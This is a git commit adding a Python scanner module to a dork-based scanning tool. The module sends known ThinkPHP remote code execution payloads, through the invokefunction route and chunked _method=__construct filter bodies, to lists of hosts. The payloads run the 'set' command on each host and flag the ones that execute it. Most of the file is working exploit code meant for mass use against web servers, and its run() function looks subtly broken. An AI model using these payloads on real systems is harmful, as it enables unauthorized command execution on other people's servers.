adf5e18af2f55a2fd2655ecae9755c823994dd9f
anhilo <anhilo@users.noreply.github.com>
2019-02-17 23:23:19 +0800

    Update thinkphp.py

--- dorkbot/scanners/thinkphp.py
+++ dorkbot/scanners/thinkphp.py
@@ -1,1 +1,75 @@
-d
+import os
+from urllib.parse import urlparse
+import requests
+
+
+data_route = "/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=set"
+data_5010 = "35\r\ns=set&filter%5B%5D=system&_method=__construct&method=\r\n0\r\n\r\n"
+data_5023 = "38\r\n_method=__construct&filter[]=system&method=GET&get[]=set\r\n0\r\n\r\n"
+data_5152 = "1f\r\nc=system&f=set&&_method=filter&\r\n0\r\n\r\n"
+
+headers = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'Accept-Language': 'en-US,en;q=0.5',
+    'Accept-Encoding': 'gzip, deflate',
+    'Content-Type': 'application/x-www-form-urlencoded', 
+    'Transfer-Encoding': 'chunked',
+}
+
+def check_route(url):
+    r = requests.get(url+data_route,timeout=1)
+    s = r.text.replace(" ","").lower()
+    if "path=" in s and "user" in s:
+        print(r.url,"route Vulnerable")
+    else:
+        print(url,"checked")
+
+
+def check5010(url):   
+    r = requests.post(url+"/index.php?s=index/index/index/",data=data_5010,headers=headers,timeout=1)
+    s = r.text.replace(" ","").lower()
+    if "path=" in s and "user" in s:
+        print(r.url,"5010 Vulnerable")
+    else:
+        print(url,"checked")
+
+def check5023(url):
+    r = requests.post(url+"/index.php?s=captcha",data=data_5023,headers=headers,timeout=1)
+    s = r.text.replace(" ","").lower()
+    if "path=" in s and "user" in s:
+        print(r.url,"5023 Vulnerable")
+    else:
+        print(url,"checked")
+        
+
+def check5152(url):
+    r = requests.post(url+"/index.php",data=data_5152,headers=headers,timeout=1)
+    s = r.text.replace(" ","").lower()
+    if "path=" in s and "user" in s:
+        print(r.url,"5152 Vulnerable")
+    else:
+        print(url,"checked")
+    
+
+
+def filecheck():
+    for line in open("./Desktop/dd.txt","r"):
+        line = line.strip("\r\n")
+        checkall("http://"+line)
+        
+def checkall(url):
+    try:
+        check5010(url)
+        check5023(url)
+        check5152(url)
+        check_route(url)
+    except:pass
+
+
+
+def run(args, target):
+    parsed_result=urlparse(target)
+    checkall(parsed_result['scheme']+'://'+ parsed_result['netloc'] +'/' + parsed_result['path'].split('/')[1])
+    vulns = []
+    return vulns
